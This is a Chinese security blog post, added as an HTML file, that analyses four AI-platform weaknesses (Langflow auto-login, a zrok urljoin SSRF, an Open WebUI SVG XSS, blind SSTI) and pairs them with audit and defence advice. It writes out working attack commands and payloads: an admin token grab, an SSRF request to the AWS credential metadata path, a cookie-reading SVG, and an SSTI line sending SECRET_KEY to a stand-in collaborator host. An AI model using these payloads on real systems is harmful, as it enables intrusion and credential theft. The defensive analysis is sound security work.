@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+    <link rel="shortcut icon" href="/assets/images/cat-final.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI平台四重攻击面：从Auto-login到盲SSTI — DARKSEC</title>
+<meta name="description" content="Langflow auto_login未认证超级令牌、zrok urljoin SSRF、Open WebUI SVG XSS、盲SSTI错误驱动方法论——四个CVE揭示AI/ML平台的系统性安全缺陷。">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;vertical-align:middle;margin-left:4px;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ AI安全 / 平台攻击面</div>
+        <h1>AI平台四重攻击面：从Auto-login到盲SSTI ⚡</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-20</span>
+          <span>⏱ 18 min read</span>
+          <span>🏷 AI平台 / SSRF / XSS / SSTI / 认证绕过</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">概述：AI平台的系统性安全缺陷</a></li>
+            <li><a href="#cve1">CVE-2026-9103：Langflow Auto-login → 超级令牌</a></li>
+            <li><a href="#cve2">CVE-2026-45568：zrok urljoin → SSRF</a></li>
+            <li><a href="#cve3">CVE-2026-56398：Open WebUI SVG → Stored XSS</a></li>
+            <li><a href="#blind-ssti">盲SSTI：错误驱动与时间驱动方法论</a></li>
+            <li><a href="#pattern">攻击模式提炼</a></li>
+            <li><a href="#defense">防御思路</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">概述：AI平台的系统性安全缺陷 🔍</h2>
+
+        <p>AI/ML平台正在成为新的高危攻击面。Langflow、Open WebUI、Gradio、Streamlit、ComfyUI——这些平台为了降低使用门槛，普遍存在「便利性优先、安全性后置」的设计哲学。今天分析四个来自不同AI产品的漏洞，它们暴露了同一类系统性问题。</p>
+
+        <p>四个CVE覆盖四种完全不同的攻击路径：</p>
+
+        <div style="background:rgba(0,240,255,0.05);border:1px solid var(--border);border-radius:8px;padding:16px;margin:16px 0;">
+          <p style="margin:0;"><strong>🔓 路径一：Auto-login端点 → 无认证超级令牌</strong><br>
+          <span style="color:var(--text);">CVE-2026-9103 (Langflow, CVSS 9.8)</span></p>
+          <hr style="border-color:var(--border);margin:12px 0;">
+          <p style="margin:0;"><strong>🔗 路径二：urljoin绝对URL → 云元数据SSRF</strong><br>
+          <span style="color:var(--text);">CVE-2026-45568 (zrok Python SDK, CVSS 7.5)</span></p>
+          <hr style="border-color:var(--border);margin:12px 0;">
+          <p style="margin:0;"><strong>🖼️ 路径三：MIME扩展名推断 → SVG Stored XSS</strong><br>
+          <span style="color:var(--text);">CVE-2026-56398 (Open WebUI, CVSS 8.7)</span></p>
+          <hr style="border-color:var(--border);margin:12px 0;">
+          <p style="margin:0;"><strong>💉 路径四：无回显SSTI → 错误/时间驱动盲注</strong><br>
+          <span style="color:var(--text);">PortSwigger Research 2025 #1 方法论</span></p>
+        </div>
+
+        <h2 id="cve1">CVE-2026-9103：Langflow Auto-login → 超级令牌 🔓</h2>
+
+        <h3>场景</h3>
+        <p><code>Langflow</code> 是一个流行的AI工作流编排平台，提供可视化拖拽构建LLM应用的能力。它有一个 <code>/api/v1/login/auto_login</code> 端点——设计目的是让演示环境快速登录，<strong>完全跳过认证流程</strong>，直接发放superuser级别的Bearer token。</p>
+
+        <h3>漏洞原理</h3>
+
+        <p>这个漏洞的恐怖之处在于：<strong>连猜都不需要</strong>。与默认凭证漏洞不同（至少还需要猜用户名/密码），auto_login端点连凭证都不需要——知道路径就够了。</p>
+
+<pre><code class="language-bash"># 只需知道端点路径，即可获取管理员令牌
+curl -s http://target:7860/api/v1/login/auto_login | jq .
+
+# 返回：
+{
+  "access_token": "eyJhbGciOiJIUzI1NiIs...",
+  "token_type": "bearer"
+}
+
+# 用这个token访问任何API
+curl -s http://target:7860/api/v1/users/ \
+  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." | jq .
+# 返回所有用户信息，包括密码哈希</code></pre>
+
+        <p>核心洞察：<strong>「自动登录」功能的设计前提是「调用者已经通过其他方式认证」</strong>，但这个前提在代码层面没有被强制执行——端点本身不验证调用者身份。这类端点往往在开发/测试阶段加入，正式发布时未被移除——因为没有对应的UI入口，代码审计容易遗漏。</p>
+
+        <h3>审计方法</h3>
+
+<pre><code class="language-bash"># 搜索代码中的auto_login端点定义
+grep -rn 'auto_login\|autoLogin\|debug_login\|dev_auth\|dev_token' \
+  --include='*.py' --include='*.js' --include='*.ts'
+
+# 直接curl测试常见AI平台
+curl -s -o /dev/null -w "%{http_code}" http://target:7860/api/v1/login/auto_login
+curl -s -o /dev/null -w "%{http_code}" http://target:7860/api/v1/auto_login
+curl -s -o /dev/null -w "%{http_code}" http://target:8000/debug/login
+
+# 检查Swagger/OpenAPI文档中的未认证端点
+curl -s http://target:7860/openapi.json | jq '.paths | keys[]' | grep -i login</code></pre>
+
+        <h3>受影响平台</h3>
+        <p>这种模式不只存在于Langflow。所有AI/ML开源平台都值得审计：</p>
+        <ul>
+          <li><strong>Gradio</strong> — <code>/login</code> 端点的认证逻辑</li>
+          <li><strong>Streamlit</strong> — 开发模式下的认证旁路</li>
+          <li><strong>ComfyUI</strong> — 默认无认证</li>
+          <li><strong>Open WebUI</strong> — 注册端点是否可控</li>
+        </ul>
+
+        <h2 id="cve2">CVE-2026-45568：zrok urljoin → SSRF 🔗</h2>
+
+        <h3>场景</h3>
+        <p><code>zrok</code> 是一个开源的网络隧道/共享工具（类似ngrok）。它的Python SDK提供了一个 <code>ProxyShare</code> 功能，用Flask实现HTTP代理路由。关键代码使用 <code>urllib.parse.urljoin()</code> 拼接后端URL和用户请求路径。</p>
+
+        <h3>漏洞原理</h3>
+
+        <p>Python的 <code>urljoin()</code> 遵循RFC 3986——当第二个参数是<strong>绝对URL</strong>（以 <code>http://</code> 或 <code>https://</code> 开头）时，第一个参数被<strong>完全忽略</strong>：</p>
+
+<pre><code class="language-python"># urljoin的正常行为
+urljoin("http://backend:8080", "/api/users")
+# → "http://backend:8080/api/users"  ✓ 正常拼接
+
+# urljoin的危险行为
+urljoin("http://backend:8080", "http://169.254.169.254/latest/meta-data/")
+# → "http://169.254.169.254/latest/meta-data/"  ✗ base被完全忽略！</code></pre>
+
+        <p>Flask代理路由接收用户请求路径后用 <code>urljoin()</code> 拼接后端URL。攻击者传入绝对URL作为路径→base被忽略→请求被转发到攻击者指定的地址→SSRF到云元数据。</p>
+
+<pre><code class="language-python"># zrok ProxyShare的漏洞代码（简化）
+@app.route('/<path:target_path>')
+def proxy(target_path):
+    backend_url = urljoin(self.backend, target_path)  # ← 漏洞点
+    return requests.get(backend_url)</code></pre>
+
+<pre><code class="language-bash"># 攻击：SSRF到AWS元数据
+curl "http://zrok-share:8080/http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# zrok内部：urljoin("http://backend:8080", "http://169.254.169.254/...")
+# → 请求被发到169.254.169.254而非backend！</code></pre>
+
+        <h3>核心洞察</h3>
+        <p><code>urljoin</code> 的「绝对URL覆盖base」行为是RFC标准设计，但开发者很少意识到用户控制的路径可以包含 <code>://</code>。Python SDK/CLI工具暴露的Flask代理路由是新的攻击面——SDK为了易用性暴露HTTP接口但缺乏安全审查。</p>
+
+        <h3>审计方法</h3>
+
+<pre><code class="language-bash"># 搜索所有urljoin调用
+grep -rn 'urljoin(' --include='*.py' | grep -v __pycache__ | grep -v test
+
+# 检查第二个参数是否来自用户输入
+grep -rn 'urljoin.*request\.' --include='*.py'
+grep -rn 'urljoin.*target_path\|urljoin.*path_info\|urljoin.*url' --include='*.py'</code></pre>
+
+        <h3>防御</h3>
+
+<pre><code class="language-python"># 安全的路径拼接——拒绝绝对URL
+from urllib.parse import urlparse
+
+def safe_urljoin(base, user_path):
+    # 如果用户路径是绝对URL，直接拒绝
+    parsed = urlparse(user_path)
+    if parsed.scheme:
+        raise ValueError(f"绝对URL被拒绝: {user_path}")
+    return urljoin(base, user_path)</code></pre>
+
+        <h2 id="cve3">CVE-2026-56398：Open WebUI SVG → Stored XSS 🖼️</h2>
+
+        <h3>场景</h3>
+        <p><code>Open WebUI</code> 是一个流行的自托管LLM Web界面。它支持OAuth/OIDC登录，会从OAuth provider获取用户的 <code>picture</code> claim（头像URL）并在页面中渲染。</p>
+
+        <h3>漏洞原理</h3>
+
+        <p>当Open WebUI获取到用户的头像URL后，它通过<strong>文件扩展名</strong>推断MIME类型，而非检查HTTP响应的 <code>Content-Type</code> 头。攻击者利用这个差异：</p>
+
+        <div style="background:rgba(255,45,120,0.05);border:1px solid rgba(255,45,120,0.2);border-radius:8px;padding:16px;margin:16px 0;">
+          <p style="margin:0;font-family:'JetBrains Mono',monospace;font-size:0.85rem;">
+            🎭 攻击者在任意图片托管服务上传 evil.svg（含XSS payload）<br>
+            → 📝 获取SVG的URL: https://imgur.com/abc123.svg<br>
+            → 🔑 攻击者在OAuth provider设置头像URL为该SVG地址<br>
+            → 🖼️ Open WebUI获取URL，根据.svg扩展名推断MIME为image/svg+xml<br>
+            → 💀 浏览器渲染SVG时执行内嵌JavaScript → 在目标域下Stored XSS
+          </p>
+        </div>
+
+<pre><code class="language-xml">&lt;!-- evil.svg 文件内容 --&gt;
+&lt;?xml version="1.0" standalone="no"?&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"&gt;
+  &lt;text x="10" y="20" fill="red"&gt;Hello&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+
+        <h3>核心洞察</h3>
+        <p>Content-Type校验的缺失使<strong>任何外部SVG托管服务都成为XSS payload的投递通道</strong>——攻击者不需要在目标系统上上传文件。与传统文件上传绕过不同，这里文件从未上传到目标服务器，而是通过URL引用远程加载。</p>
+
+        <h3>审计方法</h3>
+
+<pre><code class="language-bash"># 找到所有接受外部URL并渲染图片的功能
+grep -rn 'picture\|avatar\|image.*url\|profile.*photo' --include='*.py' --include='*.js'
+
+# 检查MIME类型判断逻辑
+grep -rn 'extname\|endswith.*\.png\|endswith.*\.jpg\|endswith.*\.svg' --include='*.py'
+grep -rn 'Content-Type\|content_type\|mimetype' --include='*.py' | grep -v 'text/html'
+
+# 测试：上传SVG到任意图片托管，然后通过URL导入
+curl -s -o evil.svg 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'
+# 上传到imgur/任意图床，获取URL，设置为OAuth头像</code></pre>
+
+        <h3>防御</h3>
+
+<pre><code class="language-python"># 安全的远程图片获取——检查Content-Type而非扩展名
+import requests
+
+def safe_fetch_image(url):
+    resp = requests.get(url, stream=True, timeout=10)
+    content_type = resp.headers.get('Content-Type', '')
+    
+    # 只允许安全的图片类型
+    ALLOWED_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}
+    
+    if content_type.split(';')[0].strip() not in ALLOWED_TYPES:
+        raise ValueError(f"不允许的Content-Type: {content_type}")
+    
+    # SVG绝不允许——它既是图片也是可执行代码
+    if 'svg' in content_type.lower():
+        raise ValueError("SVG文件不被允许")
+    
+    return resp.content</code></pre>
+
+        <h2 id="blind-ssti">盲SSTI：错误驱动与时间驱动方法论 💉</h2>
+
+        <h3>场景</h3>
+        <p>PortSwigger的Vladislav Korchagin在2025年Top 10 Web Hacking Techniques中排名第一的研究，系统化了<strong>无回显SSTI</strong>的利用方法论。当模板注入点不直接返回执行结果（如注入在邮件模板、日志消息、后台任务中），SQL盲注的全套技术可以迁移过来。</p>
+
+        <h3>三个层次</h3>
+
+        <p><strong>第一层：错误驱动（Error-based）</strong></p>
+
+<pre><code class="language-python"># Jinja2 — 触发除零错误
+{{1/0}}
+
+# Freemarker — 触发null访问
+${a.b.c}
+
+# 如果错误消息有差异（500 vs 200、不同响应时间），
+# 就能确认注入点和模板引擎类型</code></pre>
+
+        <p><strong>第二层：时间驱动（Time-based）</strong></p>
+
+<pre><code class="language-python"># Jinja2 — 大数据结构遍历制造延迟
+{{range(99999999)|list}}
+
+# Freemarker — 循环时间操作
+${.now?long}
+
+# 通过响应时间差异逐字符提取数据
+# 与time-based SQLi完全同构</code></pre>
+
+        <p><strong>第三层：Polyglot探针</strong></p>
+
+<pre><code class="language-python"># 多引擎兼容的检测payload
+${{<%[%'"}}%\
+
+# 一次请求同时探测Jinja2/Twig/Freemarker/Velocity/ERB等引擎
+# 根据响应差异区分具体引擎类型</code></pre>
+
+        <h3>核心洞察</h3>
+        <p><strong>SSTI的利用不应只关注有回显场景</strong>——SQL注入花了十年才系统化盲注技术，SSTI也应该系统化盲用。对每个疑似SSTI的点，先测error-based（<code>{{1/0}}</code>）、再测time-based（<code>{{sleep(5)}}</code>）、最后OOB（<code>{{request("http://collab/ping")}}</code>）。</p>
+
+        <h3>审计方法</h3>
+
+<pre><code class="language-bash"># 1. 确认SSTI注入点
+curl -s "http://target/submit?name={{7*7}}" | grep "49"
+
+# 2. Error-based确认引擎
+curl -s -o /dev/null -w "%{http_code}" "http://target/submit?name={{1/0}}"
+# Jinja2返回500，其他引擎可能返回200
+
+# 3. Time-based盲注
+time curl -s "http://target/submit?name={{range(99999999)|list}}" 
+# 如果耗时明显增加，确认Jinja2
+
+# 4. OOB数据外带
+curl -s "http://target/submit?name={{request('http://collaborator/ping?data='+config.SECRET_KEY)}}"</code></pre>
+
+        <h2 id="pattern">攻击模式提炼 🧠</h2>
+
+        <p>四个漏洞的共同底层模式——<strong>AI平台的「便利性」=「攻击面」</strong>：</p>
+
+        <table style="width:100%;border-collapse:collapse;margin:16px 0;">
+          <thead>
+            <tr style="border-bottom:2px solid var(--border);">
+              <th style="text-align:left;padding:12px 8px;">维度</th>
+              <th style="text-align:left;padding:12px 8px;">Auto-login</th>
+              <th style="text-align:left;padding:12px 8px;">urljoin SSRF</th>
+              <th style="text-align:left;padding:12px 8px;">SVG XSS</th>
+              <th style="text-align:left;padding:12px 8px;">盲SSTI</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr style="border-bottom:1px solid var(--border);">
+              <td style="padding:8px;"><strong>便利性功能</strong></td>
+              <td style="padding:8px;">快速登录</td>
+              <td style="padding:8px;">路径拼接</td>
+              <td style="padding:8px;">头像导入</td>
+              <td style="padding:8px;">模板渲染</td>
+            </tr>
+            <tr style="border-bottom:1px solid var(--border);">
+              <td style="padding:8px;"><strong>安全假设</strong></td>
+              <td style="padding:8px;">"内网可信"</td>
+              <td style="padding:8px;">"路径是相对的"</td>
+              <td style="padding:8px;">"扩展名=类型"</td>
+              <td style="padding:8px;">"无回显=无害"</td>
+            </tr>
+            <tr style="border-bottom:1px solid var(--border);">
+              <td style="padding:8px;"><strong>实际后果</strong></td>
+              <td style="padding:8px;">未认证RCE</td>
+              <td style="padding:8px;">云元数据泄露</td>
+              <td style="padding:8px;">Stored XSS→ATO</td>
+              <td style="padding:8px;">盲RCE/数据泄露</td>
+            </tr>
+            <tr>
+              <td style="padding:8px;"><strong>根因</strong></td>
+              <td style="padding:8px;" colspan="4">便利性功能的安全假设在代码层面未被强制执行</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <p>AI平台的攻击面<strong>比传统Web应用更广</strong>，因为它们通常同时暴露：</p>
+        <ul>
+          <li>REST API（管理操作）</li>
+          <li>WebSocket（实时通信）</li>
+          <li>文件上传/下载（模型、数据集）</li>
+          <li>代码执行环境（Python sandbox）</li>
+          <li>OAuth/SSO集成（第三方认证）</li>
+        </ul>
+
+        <h2 id="defense">防御思路 🛡️</h2>
+
+        <h3>1. Auto-login类端点</h3>
+        <ul>
+          <li>生产环境<strong>删除所有便利性认证端点</strong>，不注释、不加flag，直接删除</li>
+          <li>如果必须保留，加IP白名单 + 环境变量开关 + 请求来源校验</li>
+          <li>CI/CD中加入 <code>grep -rn auto_login src/</code> 作为安全门禁</li>
+        </ul>
+
+        <h3>2. URL拼接</h3>
+        <ul>
+          <li>永远不要用 <code>urljoin(base, user_input)</code> 做路径拼接</li>
+          <li>使用 <code>urlparse</code> 先解析，确认 <code>scheme</code> 为空后再拼接</li>
+          <li>代理路由的白名单只允许相对路径（不包含 <code>://</code>）</li>
+        </ul>
+
+        <h3>3. 远程资源MIME判断</h3>
+        <ul>
+          <li>永远基于 <code>Content-Type</code> 响应头判断类型，不看扩展名</li>
+          <li>禁止SVG（SVG = 图片 + XSS载体，不可分割）</li>
+          <li>对外部图片做服务端二次验证（magic bytes检查）</li>
+        </ul>
+
+        <h3>4. 模板注入防护</h3>
+        <ul>
+          <li>用户输入绝不进入模板字符串——用参数化渲染而非字符串拼接</li>
+          <li>对所有模板渲染点做SSTI fuzzing（<code>{{7*7}}</code>、<code>{{1/0}}</code>、<code>${7*7}</code>）</li>
+          <li>邮件/日志/通知模板也要测试——「无回显」不等于「无害」</li>
+        </ul>
+
+        <blockquote>
+          <p>AI平台的安全问题不是个别产品的bug，而是整个品类的设计哲学问题——「降低门槛」和「安全默认」是天然矛盾的。当你在用一个AI平台时，先问自己：它为了便利性，跳过了哪些安全决策？🛡️</p>
+        </blockquote>
+
+        <div class="article-tags">
+          <span class="tag pink">AI安全</span>
+          <span class="tag">SSRF</span>
+          <span class="tag purple">SSTI</span>
+          <span class="tag yellow">认证绕过</span>
+          <span class="tag cyan">CVE</span>
+        </div>
+
+        <p style="text-align:center;margin-top:40px;color:var(--text-dim);font-style:italic;">
+          ~ 感谢阅读 nya~ 🐱✨
+        </p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+      <div style="text-align:center;margin-bottom:16px;">
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+        </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 漏洞不会消失，只会转移 nya~ 」</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
